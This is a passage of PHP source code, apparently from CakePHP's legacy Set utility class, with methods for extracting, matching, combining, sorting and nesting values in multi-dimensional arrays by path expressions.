				if (!isset($context['trace'])) {
					$context = array('trace' => array(null), 'item' => $context, 'key' => $key);
				}
				if ($token === '..') {
					if (count($context['trace']) === 1) {
						$context['trace'][] = $context['key'];
					}
					$parent = implode('/', $context['trace']) . '/.';
					$context['item'] = Set::extract($parent, $data);
					$context['key'] = array_pop($context['trace']);
					if (isset($context['trace'][1]) && $context['trace'][1] > 0) {
						$context['item'] = $context['item'][0];
					} elseif (!empty($context['item'][$key])) {
						$context['item'] = $context['item'][$key];
					} else {
						$context['item'] = array_shift($context['item']);
					}
					$matches[] = $context;
					continue;
				}
				if ($token === '@*' && is_array($context['item'])) {
					$matches[] = array(
						'trace' => array_merge($context['trace'], (array)$key),
						'key' => $key,
						'item' => array_keys($context['item']),
					);
				} elseif (is_array($context['item'])
					&& array_key_exists($token, $context['item'])
					&& !(strval($key) === strval($token) && count($tokens) === 1 && $tokens[0] === '.')) {
					$items = $context['item'][$token];
					if (!is_array($items)) {
						$items = array($items);
					} elseif (!isset($items[0])) {
						$current = current($items);
						$currentKey = key($items);
						if (!is_array($current) || (is_array($current) && count($items) <= 1 && !is_numeric($currentKey))) {
							$items = array($items);
						}
					}

					foreach ($items as $key => $item) {
						$ctext = array($context['key']);
						if (!is_numeric($key)) {
							$ctext[] = $token;
							$tok = array_shift($tokens);
							if (isset($items[$tok])) {
								$ctext[] = $tok;
								$item = $items[$tok];
								$matches[] = array(
									'trace' => array_merge($context['trace'], $ctext),
									'key' => $tok,
									'item' => $item,
								);
								break;
							} elseif ($tok !== null) {
								array_unshift($tokens, $tok);
							}
						} else {
							$key = $token;
						}

						$matches[] = array(
							'trace' => array_merge($context['trace'], $ctext),
							'key' => $key,
							'item' => $item,
						);
					}
				} elseif ($key === $token || (ctype_digit($token) && $key == $token) || $token === '.') {
					$context['trace'][] = $key;
					$matches[] = array(
						'trace' => $context['trace'],
						'key' => $key,
						'item' => $context['item'],
					);
				}
			}
			if ($conditions) {
				foreach ($conditions as $condition) {
					$filtered = array();
					$length = count($matches);
					foreach ($matches as $i => $match) {
						if (Set::matches(array($condition), $match['item'], $i + 1, $length)) {
							$filtered[$i] = $match;
						}
					}
					$matches = $filtered;
				}
			}
			$contexts = $matches;

			if (empty($tokens)) {
				break;
			}
		} while (1);

		$r = array();

		foreach ($matches as $match) {
			if ((!$options['flatten'] || is_array($match['item'])) && !is_int($match['key'])) {
				$r[] = array($match['key'] => $match['item']);
			} else {
				$r[] = $match['item'];
			}
		}
		return $r;
	}

/**
 * This function can be used to see if a single item or a given xpath match certain conditions.
 *
 * @param string|array $conditions An array of condition strings or an XPath expression
 * @param array $data An array of data to execute the match on
 * @param int $i Optional: The 'nth'-number of the item being matched.
 * @param int $length Length.
 * @return bool
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::matches
 */
	public static function matches($conditions, $data = array(), $i = null, $length = null) {
		if (empty($conditions)) {
			return true;
		}
		if (is_string($conditions)) {
			return (bool)Set::extract($conditions, $data);
		}
		foreach ($conditions as $condition) {
			if ($condition === ':last') {
				if ($i != $length) {
					return false;
				}
				continue;
			} elseif ($condition === ':first') {
				if ($i != 1) {
					return false;
				}
				continue;
			}
			if (!preg_match('/(.+?)([><!]?[=]|[><])(.*)/', $condition, $match)) {
				if (ctype_digit($condition)) {
					if ($i != $condition) {
						return false;
					}
				} elseif (preg_match_all('/(?:^[0-9]+|(?<=,)[0-9]+)/', $condition, $matches)) {
					return in_array($i, $matches[0]);
				} elseif (!array_key_exists($condition, $data)) {
					return false;
				}
				continue;
			}
			list(, $key, $op, $expected) = $match;
			if (!(isset($data[$key]) || array_key_exists($key, $data))) {
				return false;
			}

			$val = $data[$key];

			if ($op === '=' && $expected && $expected{0} === '/') {
				return preg_match($expected, $val);
			}
			if ($op === '=' && $val != $expected) {
				return false;
			}
			if ($op === '!=' && $val == $expected) {
				return false;
			}
			if ($op === '>' && $val <= $expected) {
				return false;
			}
			if ($op === '<' && $val >= $expected) {
				return false;
			}
			if ($op === '<=' && $val > $expected) {
				return false;
			}
			if ($op === '>=' && $val < $expected) {
				return false;
			}
		}
		return true;
	}

/**
 * Gets a value from an array or object that is contained in a given path using an array path syntax, i.e.:
 * "{n}.Person.{[a-z]+}" - Where "{n}" represents a numeric key, "Person" represents a string literal,
 * and "{[a-z]+}" (i.e. any string literal enclosed in brackets besides {n} and {s}) is interpreted as
 * a regular expression.
 *
 * @param array $data Array from where to extract
 * @param string|array $path As an array, or as a dot-separated string.
 * @return mixed An array of matched items or the content of a single selected item or null in any of these cases: $path or $data are null, no items found.
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::classicExtract
 */
	public static function classicExtract($data, $path = null) {
		if (empty($path)) {
			return $data;
		}
		if (is_object($data)) {
			if (!($data instanceof ArrayAccess || $data instanceof Traversable)) {
				$data = get_object_vars($data);
			}
		}
		if (empty($data)) {
			return null;
		}
		if (is_string($path) && strpos($path, '{') !== false) {
			$path = String::tokenize($path, '.', '{', '}');
		} elseif (is_string($path)) {
			$path = explode('.', $path);
		}
		$tmp = array();

		if (empty($path)) {
			return null;
		}

		foreach ($path as $i => $key) {
			if (is_numeric($key) && (int)$key > 0 || $key === '0') {
				if (isset($data[$key])) {
					$data = $data[$key];
				} else {
					return null;
				}
			} elseif ($key === '{n}') {
				foreach ($data as $j => $val) {
					if (is_int($j)) {
						$tmpPath = array_slice($path, $i + 1);
						if (empty($tmpPath)) {
							$tmp[] = $val;
						} else {
							$tmp[] = Set::classicExtract($val, $tmpPath);
						}
					}
				}
				return $tmp;
			} elseif ($key === '{s}') {
				foreach ($data as $j => $val) {
					if (is_string($j)) {
						$tmpPath = array_slice($path, $i + 1);
						if (empty($tmpPath)) {
							$tmp[] = $val;
						} else {
							$tmp[] = Set::classicExtract($val, $tmpPath);
						}
					}
				}
				return $tmp;
			} elseif (strpos($key, '{') !== false && strpos($key, '}') !== false) {
				$pattern = substr($key, 1, -1);

				foreach ($data as $j => $val) {
					if (preg_match('/^' . $pattern . '/s', $j) !== 0) {
						$tmpPath = array_slice($path, $i + 1);
						if (empty($tmpPath)) {
							$tmp[$j] = $val;
						} else {
							$tmp[$j] = Set::classicExtract($val, $tmpPath);
						}
					}
				}
				return $tmp;
			} else {
				if (isset($data[$key])) {
					$data = $data[$key];
				} else {
					return null;
				}
			}
		}
		return $data;
	}

/**
 * Inserts $data into an array as defined by $path.
 *
 * @param array $list Where to insert into
 * @param string $path A dot-separated string.
 * @param array $data Data to insert
 * @return array
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::insert
 */
	public static function insert($list, $path, $data = null) {
		return Hash::insert($list, $path, $data);
	}

/**
 * Removes an element from a Set or array as defined by $path.
 *
 * @param array $list From where to remove
 * @param string $path A dot-separated string.
 * @return array Array with $path removed from its value
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::remove
 */
	public static function remove($list, $path = null) {
		return Hash::remove($list, $path);
	}

/**
 * Checks if a particular path is set in an array
 *
 * @param string|array $data Data to check on
 * @param string|array $path A dot-separated string.
 * @return bool true if path is found, false otherwise
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::check
 */
	public static function check($data, $path = null) {
		if (empty($path)) {
			return $data;
		}
		if (!is_array($path)) {
			$path = explode('.', $path);
		}

		foreach ($path as $i => $key) {
			if (is_numeric($key) && (int)$key > 0 || $key === '0') {
				$key = (int)$key;
			}
			if ($i === count($path) - 1) {
				return (is_array($data) && array_key_exists($key, $data));
			}

			if (!is_array($data) || !array_key_exists($key, $data)) {
				return false;
			}
			$data =& $data[$key];
		}
		return true;
	}

/**
 * Computes the difference between a Set and an array, two Sets, or two arrays
 *
 * @param mixed $val1 First value
 * @param mixed $val2 Second value
 * @return array Returns the key => value pairs that are not common in $val1 and $val2
 * The expression for this function is($val1 - $val2) + ($val2 - ($val1 - $val2))
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::diff
 */
	public static function diff($val1, $val2 = null) {
		if (empty($val1)) {
			return (array)$val2;
		}
		if (empty($val2)) {
			return (array)$val1;
		}
		$intersection = array_intersect_key($val1, $val2);
		while (($key = key($intersection)) !== null) {
			if ($val1[$key] == $val2[$key]) {
				unset($val1[$key]);
				unset($val2[$key]);
			}
			next($intersection);
		}

		return $val1 + $val2;
	}

/**
 * Determines if one Set or array contains the exact keys and values of another.
 *
 * @param array $val1 First value
 * @param array $val2 Second value
 * @return bool true if $val1 contains $val2, false otherwise
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::contains
 */
	public static function contains($val1, $val2 = null) {
		if (empty($val1) || empty($val2)) {
			return false;
		}

		foreach ($val2 as $key => $val) {
			if (is_numeric($key)) {
				Set::contains($val, $val1);
			} else {
				if (!isset($val1[$key]) || $val1[$key] != $val) {
					return false;
				}
			}
		}
		return true;
	}

/**
 * Counts the dimensions of an array. If $all is set to false (which is the default) it will
 * only consider the dimension of the first element in the array.
 *
 * @param array $array Array to count dimensions on
 * @param bool $all Set to true to count the dimension considering all elements in array
 * @param int $count Start the dimension count at this number
 * @return int The number of dimensions in $array
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::countDim
 */
	public static function countDim($array, $all = false, $count = 0) {
		if ($all) {
			$depth = array($count);
			if (is_array($array) && reset($array) !== false) {
				foreach ($array as $value) {
					$depth[] = Set::countDim($value, true, $count + 1);
				}
			}
			$return = max($depth);
		} else {
			if (is_array(reset($array))) {
				$return = Set::countDim(reset($array)) + 1;
			} else {
				$return = 1;
			}
		}
		return $return;
	}

/**
 * Normalizes a string or array list.
 *
 * @param mixed $list List to normalize
 * @param bool $assoc If true, $list will be converted to an associative array
 * @param string $sep If $list is a string, it will be split into an array with $sep
 * @param bool $trim If true, separated strings will be trimmed
 * @return array
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::normalize
 */
	public static function normalize($list, $assoc = true, $sep = ',', $trim = true) {
		if (is_string($list)) {
			$list = explode($sep, $list);
			if ($trim) {
				foreach ($list as $key => $value) {
					$list[$key] = trim($value);
				}
			}
			if ($assoc) {
				return Hash::normalize($list);
			}
		} elseif (is_array($list)) {
			$list = Hash::normalize($list, $assoc);
		}
		return $list;
	}

/**
 * Creates an associative array using a $path1 as the path to build its keys, and optionally
 * $path2 as path to get the values. If $path2 is not specified, all values will be initialized
 * to null (useful for Set::merge). You can optionally group the values by what is obtained when
 * following the path specified in $groupPath.
 *
 * @param array|object $data Array or object from where to extract keys and values
 * @param string|array $path1 As an array, or as a dot-separated string.
 * @param string|array $path2 As an array, or as a dot-separated string.
 * @param string $groupPath As an array, or as a dot-separated string.
 * @return array Combined array
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::combine
 */
	public static function combine($data, $path1 = null, $path2 = null, $groupPath = null) {
		if (empty($data)) {
			return array();
		}

		if (is_object($data)) {
			if (!($data instanceof ArrayAccess || $data instanceof Traversable)) {
				$data = get_object_vars($data);
			}
		}

		if (is_array($path1)) {
			$format = array_shift($path1);
			$keys = Set::format($data, $format, $path1);
		} else {
			$keys = Set::extract($data, $path1);
		}
		if (empty($keys)) {
			return array();
		}

		if (!empty($path2) && is_array($path2)) {
			$format = array_shift($path2);
			$vals = Set::format($data, $format, $path2);
		} elseif (!empty($path2)) {
			$vals = Set::extract($data, $path2);
		} else {
			$count = count($keys);
			for ($i = 0; $i < $count; $i++) {
				$vals[$i] = null;
			}
		}

		if ($groupPath) {
			$group = Set::extract($data, $groupPath);
			if (!empty($group)) {
				$c = count($keys);
				for ($i = 0; $i < $c; $i++) {
					if (!isset($group[$i])) {
						$group[$i] = 0;
					}
					if (!isset($out[$group[$i]])) {
						$out[$group[$i]] = array();
					}
					$out[$group[$i]][$keys[$i]] = $vals[$i];
				}
				return $out;
			}
		}
		if (empty($vals)) {
			return array();
		}
		return array_combine($keys, $vals);
	}

/**
 * Converts an object into an array.
 *
 * @param object $object Object to reverse
 * @return array Array representation of given object
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::reverse
 */
	public static function reverse($object) {
		$out = array();
		if ($object instanceof SimpleXMLElement) {
			return Xml::toArray($object);
		} elseif (is_object($object)) {
			$keys = get_object_vars($object);
			if (isset($keys['_name_'])) {
				$identity = $keys['_name_'];
				unset($keys['_name_']);
			}
			$new = array();
			foreach ($keys as $key => $value) {
				if (is_array($value)) {
					$new[$key] = (array)Set::reverse($value);
				} else {
					// @codingStandardsIgnoreStart Legacy junk
					if (isset($value->_name_)) {
						$new = array_merge($new, Set::reverse($value));
					} else {
						$new[$key] = Set::reverse($value);
					}
					// @codingStandardsIgnoreEnd
				}
			}
			if (isset($identity)) {
				$out[$identity] = $new;
			} else {
				$out = $new;
			}
		} elseif (is_array($object)) {
			foreach ($object as $key => $value) {
				$out[$key] = Set::reverse($value);
			}
		} else {
			$out = $object;
		}
		return $out;
	}

/**
 * Collapses a multi-dimensional array into a single dimension, using a delimited array path for
 * each array element's key, i.e. array(array('Foo' => array('Bar' => 'Far'))) becomes
 * array('0.Foo.Bar' => 'Far').
 *
 * @param array $data Array to flatten
 * @param string $separator String used to separate array key elements in a path, defaults to '.'
 * @return array
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::flatten
 */
	public static function flatten($data, $separator = '.') {
		return Hash::flatten($data, $separator);
	}

/**
 * Expand/unflattens a string to an array
 *
 * For example, unflattens an array that was collapsed with `Set::flatten()`
 * into a multi-dimensional array. So, `array('0.Foo.Bar' => 'Far')` becomes
 * `array(array('Foo' => array('Bar' => 'Far')))`.
 *
 * @param array $data Flattened array
 * @param string $separator The delimiter used
 * @return array
 */
	public static function expand($data, $separator = '.') {
		return Hash::expand($data, $separator);
	}

/**
 * Flattens an array for sorting
 *
 * @param array $results Array to flatten.
 * @param string $key Key.
 * @return array
 */
	protected static function _flatten($results, $key = null) {
		$stack = array();
		foreach ($results as $k => $r) {
			$id = $k;
			if ($key !== null) {
				$id = $key;
			}
			if (is_array($r) && !empty($r)) {
				$stack = array_merge($stack, Set::_flatten($r, $id));
			} else {
				$stack[] = array('id' => $id, 'value' => $r);
			}
		}
		return $stack;
	}

/**
 * Sorts an array by any value, determined by a Set-compatible path
 *
 * @param array $data An array of data to sort
 * @param string $path A Set-compatible path to the array value
 * @param string $dir Direction of sorting - either ascending (ASC), or descending (DESC)
 * @return array Sorted array of data
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::sort
 */
	public static function sort($data, $path, $dir) {
		if (empty($data)) {
			return $data;
		}
		$originalKeys = array_keys($data);
		$numeric = false;
		if (is_numeric(implode('', $originalKeys))) {
			$data = array_values($data);
			$numeric = true;
		}
		$result = Set::_flatten(Set::extract($data, $path));
		list($keys, $values) = array(Set::extract($result, '{n}.id'), Set::extract($result, '{n}.value'));

		$dir = strtolower($dir);
		if ($dir === 'asc') {
			$dir = SORT_ASC;
		} elseif ($dir === 'desc') {
			$dir = SORT_DESC;
		}
		array_multisort($values, $dir, $keys, $dir);
		$sorted = array();
		$keys = array_unique($keys);

		foreach ($keys as $k) {
			if ($numeric) {
				$sorted[] = $data[$k];
			} else {
				if (isset($originalKeys[$k])) {
					$sorted[$originalKeys[$k]] = $data[$originalKeys[$k]];
				} else {
					$sorted[$k] = $data[$k];
				}
			}
		}
		return $sorted;
	}

/**
 * Allows the application of a callback method to elements of an
 * array extracted by a Set::extract() compatible path.
 *
 * @param mixed $path Set-compatible path to the array value
 * @param array $data An array of data to extract from & then process with the $callback.
 * @param mixed $callback Callback method to be applied to extracted data.
 * See http://ca2.php.net/manual/en/language.pseudo-types.php#language.types.callback for examples
 * of callback formats.
 * @param array $options Options are:
 *                       - type : can be pass, map, or reduce. Map will handoff the given callback
 *                                to array_map, reduce will handoff to array_reduce, and pass will
 *                                use call_user_func_array().
 * @return mixed Result of the callback when applied to extracted data
 * @link http://book.cakephp.org/2.0/en/core-utility-libraries/set.html#Set::apply
 */
	public static function apply($path, $data, $callback, $options = array()) {
		$defaults = array('type' => 'pass');
		$options += $defaults;
		$extracted = Set::extract($path, $data);

		if ($options['type'] === 'map') {
			return array_map($callback, $extracted);
		} elseif ($options['type'] === 'reduce') {
			return array_reduce($extracted, $callback);
		} elseif ($options['type'] === 'pass') {
			return call_user_func_array($callback, array($extracted));
		}
		return null;
	}

/**
 * Takes in a flat array and returns a nested array
 *
 * @param mixed $data Data
 * @param array $options Options are:
 *      children   - the key name to use in the resultset for children
 *      idPath     - the path to a key that identifies each entry
 *      parentPath - the path to a key that identifies the parent of each entry
 *      root       - the id of the desired top-most result
 * @return array of results, nested
 * @link
 */
	public static function nest($data, $options = array()) {
		if (!$data) {
			return $data;
		}

		$alias = key(current($data));
		$options += array(
			'idPath' => "/$alias/id",
			'parentPath' => "/$alias/parent_id",
			'children' => 'children',
			'root' => null
		);

		$return = $idMap = array();
		$ids = Set::extract($data, $options['idPath']);
		$idKeys = explode('/', trim($options['idPath'], '/'));
		$parentKeys = explode('/', trim($options['parentPath'], '/'));

		foreach ($data as $result) {
			$result[$options['children']] = array();

			$id = Set::get($result, $idKeys);
			$parentId = Set::get($result, $parentKeys);

			if (isset($idMap[$id][$options['children']])) {
				$idMap[$id] = array_merge($result, (array)$idMap[$id]);
			} else {
				$idMap[$id] = array_merge($result, array($options['children'] => array()));
			}
			if (!$parentId || !in_array($parentId, $ids)) {
				$return[] =& $idMap[$id];
			} else {
				$idMap[$parentId][$options['children']][] =& $idMap[$id];
			}
		}

		if ($options['root']) {
			$root = $options['root'];
		} else {
			$root = Set::get($return[0], $parentKeys);
		}

		foreach ($return as $i => $result) {
			$id = Set::get($result, $idKeys);
			$parentId = Set::get($result, $parentKeys);
			if ($id !== $root && $parentId != $root) {
				unset($return[$i]);
			}
		}

		return array_values($return);
	}

/**
 * Return the value at the specified position
 *
 * @param array $input an array
 * @param string|array $path string or array of array keys
 * @return the value at the specified position or null if it doesn't exist
 */
	public static function get($input, $path = null) {
		if (is_string($path)) {
			if (strpos($path, '/') !== false) {
				$keys = explode('/', trim($path, '/'));
			} else {
				$keys = explode('.', trim($path, '.'));
			}
		} else {
			$keys = $path;
		}
		return Hash::get($input, $keys);
	}

}
